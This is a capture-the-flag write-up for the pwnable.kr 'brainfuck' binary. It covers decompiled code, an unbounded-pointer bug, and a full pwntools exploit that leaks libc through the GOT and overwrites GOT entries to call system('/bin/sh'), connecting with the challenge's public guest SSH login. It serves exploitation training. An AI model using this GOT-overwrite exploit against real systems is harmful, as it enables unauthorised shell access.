# Pwnable.kr Brainfuck CTF Writeup

## Brainfuck Basics
The syntax of Brainfuck is very simple:
```
> = increases memory pointer, or moves the pointer to the right 1 block.
< = decreases memory pointer, or moves the pointer to the left 1 block.
+ = increases value stored at the block pointed to by the memory pointer.
- = decreases value stored at the block pointed to by the memory pointer.
[ = like C while(cur_block_value != 0) loop.
] = if block currently pointed to's value is not zero, jump back to [.
, = like C getchar(). Inputs 1 character.
. = like C putchar(). Prints 1 character to the console.
```

## Problem Description
The executable for this challenge receives Brainfuck code and executes it. When decompiling the ELF file, we get this:
### main
```c
08048671  int32_t main(int32_t argc, char** argv, char** envp)
08048671  {
08048681      char** argv_1 = argv;
08048685      void* gsbase;
08048685      int32_t eax_1 = *(uint32_t*)((char*)gsbase + 0x14);
080486b4      setvbuf(stdout, nullptr, 2, 0);
080486d9      setvbuf(stdin, nullptr, 1, 0);
080486de      p = 0x804a0a0;
080486ef      puts("welcome to brainfuck testing sys…");
080486fb      puts("type some brainfuck instructions…");
08048717      void buf;
08048717      memset(&buf, 0, 0x400);
08048734      fgets(&buf, 0x400, stdin);
08048734      
0804876b      for (int32_t i = 0; i < strlen(&buf); i += 1)
08048756          do_brainfuck(*(uint8_t*)(i + &buf));
08048756      
08048787      if (eax_1 == *(uint32_t*)((char*)gsbase + 0x14))
08048792          return 0;
08048792      
08048789      __stack_chk_fail();
08048789      /* no return */
08048671  }
```
### do_brainfuck
```c
080485dc  int32_t do_brainfuck(char arg1)
080485dc  {
080485ed      int32_t p_1 = (((int32_t)arg1) - 0x2b);
080485ed      
080485f3      if (p_1 <= 0x30)
080485f3      {
080485f5          p_1 = jump_table_8048848[p_1];
080485f5          
080485fc          switch (p_1)
080485fc          {
08048603              case 0x80485fe:
08048603              {
08048603                  p_1 = (p + 1);
08048606                  p = p_1;
08048603                  break;
08048603              }
08048612              case 0x804860d:
08048612              {
08048612                  p_1 = (p - 1);
08048615                  p = p_1;
08048612                  break;
08048612              }
0804861c              case 0x804861c:
0804861c              {
0804861c                  p_1 = p;
08048627                  *(uint8_t*)p_1 += 1;
0804861c                  break;
0804861c              }
0804862b              case 0x804862b:
0804862b              {
0804862b                  p_1 = p;
08048636                  *(uint8_t*)p_1 -= 1;
0804862b                  break;
0804862b              }
08048648              case 0x804863a:
08048648              {
08048648                  return putchar(((int32_t)**(uint8_t**)&p));
08048648                  break;
08048648              }
0804864f              case 0x804864f:
0804864f              {
0804864f                  char* p_2 = p;
08048655                  p_1 = getchar();
0804865a                  *(uint8_t*)p_2 = p_1;
0804864f                  break;
0804864f              }
08048665              case 0x804865e:
08048665              {
08048665                  return puts("[ and ] not supported.");
08048665                  break;
08048665              }
080485fc          }
080485f3      }
080485f3      
08048670      return p_1;
080485dc  }
```
As you can see, the `[` and `]` are not supported. Our goal is to find a bug and exploit it to get a shell.

## Analysis
The vulnerability in this program is that there are no boundaries in memory, so we can change the pointer `p` to any location we want and read/write to it.
### #1 Idea
My first idea was to overwrite the GOT (Global Offset Table) so that some function the program uses (like `getchar()`) will have the address of a function I will create, which will be:
```c
void main(){
  system("/bin/sh");
}
```
Since `system` is not in the GOT, I would need to find the base address of libc and add to it the `system` offset (by looking in the `.so` file).
To find the base address of libc, I would use Brainfuck to move to the GOT and read the address of some function, and then subtract this address with the offset of this function in the `.so` file.
I also used this method for the string "/bin/sh". So at the end, my function looked like this:
```asm
BITS 32
section .text

push dword [0xf7ed8b2b]
call 0xf7dc5170
```
*Note:* When I solved this, I hadn't noticed there was ASLR, so this should not work.
I then converted this assembly file to hex and wrote this hex to memory using Brainfuck. The Brainfuck pointer of the program starts at `0x804a0a0`, so this is where my function starts.
I then changed the `getchar()` function in the GOT to point to my function (which is at `0x804a0a0`). This is the exploit code:
```python
from pwn import *

context.log_level = 'debug'
session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
p = session.process('./brainfuck')

output = p.recvuntil(b"type some brainfuck instructions except [ ]\n")
print(output.decode(errors='ignore'), end='')

bf_code = ',>' * 10 + ',' + '<' * (10 + 148) + ',>' * 3 + ',' + ','
print(bf_code)
p.sendline(bf_code.encode())

payload = bytes.fromhex("ff352b8bedf7e86551dcf7" + "0804a0a0")
print(payload)
p.send(payload)

p.interactive()
session.close()
```
However, when I ran this, it didn't work because of a simple reason: the NX bit was enabled. The NX bit is a security feature in modern processors that marks certain memory regions (like `.bss`) as non-executable. I wrote my function in the `.bss` section, so it couldn't run because of it.

### #2 Idea
For my second idea, I took a different approach. I understood that `system` should be one of the functions that the program already uses. So my plan was to change some function I could call (like `putchar`) in the GOT to the `main` function and change `strlen` to `system`. In that way, I could also run my Brainfuck code (and change the GOT) and also use the `fgets` in the second run to write "/bin/sh" to a buffer which `strlen` uses, resulting in the calling of `system("/bin/sh")`.
However, it also didn't work. That's because in the first run, when I changed the address of `strlen` in the GOT, the program used the new address of `strlen` while in the loop, which caused the rest of the Brainfuck code to not run.

### #3 Idea (and Last!)
Instead of changing the `strlen` function, I changed the `fgets` function to `system` and the `memset` function to `gets`. That's because I wanted to write "/bin/sh" to `buf`, so I needed to replace `memset` with some function that writes my input to memory. However, the only function I could use was `gets`, because it only takes one argument. So when calling `memset(&buf, 0, 0x400);`, it only uses the first argument (`&buf`), which results in calling `gets(&buf)`, which is exactly what I needed. Afterwards, there is `fgets(&buf, 0x400, stdin);`, and here the program also only uses the first argument, resulting in `system(&buf)`. In `buf`, I would write "/bin/sh", so eventually it will run `system("/bin/sh")` and give me a shell.

## Exploit Code
```python
from pwn import *

context(log_level='debug', os='linux', arch='i386')

session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest') # When I solved this challenge, nc did not work
p = session.process('./brainfuck')

# Local files for finding offsets (which are not affected by ASLR)
e = ELF(r'/mnt/c/users/dalal/desktop/private_projects/ctf/pwnable.kr/brainfuck/brainfuck')
libc = ELF(r'/usr/lib32/libc.so.6')

fgets_got = e.got['fgets']
memset_got = e.got['memset']
putchar_got = e.got['putchar']

# Libc offsets
fgets_offset = libc.symbols['fgets']
gets_offset = libc.symbols['gets']
system_offset = libc.symbols['system']
main_addr = 0x08048700 # does not affected by ASLR

tape_addr = 0x804a0a0

payload = ""

# Move to fgets@got
payload += "<" * (tape_addr - fgets_got)

# Leak 4 bytes of fgets address
payload += ".>" * 4
payload += "<" * 4 

# Overwrite fgets@got with system address
payload += ",>" * 4
payload += "<" * 4

# Move to memset@got
payload += ">" * (memset_got - fgets_got)

# Overwrite memset@got with gets address
payload += ",>" * 4

# Overwrite putchar@got with main address (The pointer is already in putchar@got so no need to move)
payload += ",>" * 4

# Trigger main() by calling putchar
payload += "."

p.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload.encode())
sleep(0.1)

fgets_addr = u32(p.recvn(4))

libc_base = fgets_addr - fgets_offset
system_addr = libc_base + system_offset
gets_addr = libc_base + gets_offset

log.info(f"fgets_addr: {hex(fgets_addr)}")
log.info(f"libc base: {hex(libc_base)}")
log.info(f"system_addr: {hex(system_addr)}")
log.info(f"gets_addr: {hex(gets_addr)}")
log.info(f"main_addr: {hex(main_addr)}")

payload = p32(system_addr) + p32(gets_addr) + p32(main_addr)
p.send(payload)
sleep(0.3)

p.send(b"/bin/sh") # Send "/bin/sh" to trigger system("/bin/sh")

session.interactive()
```
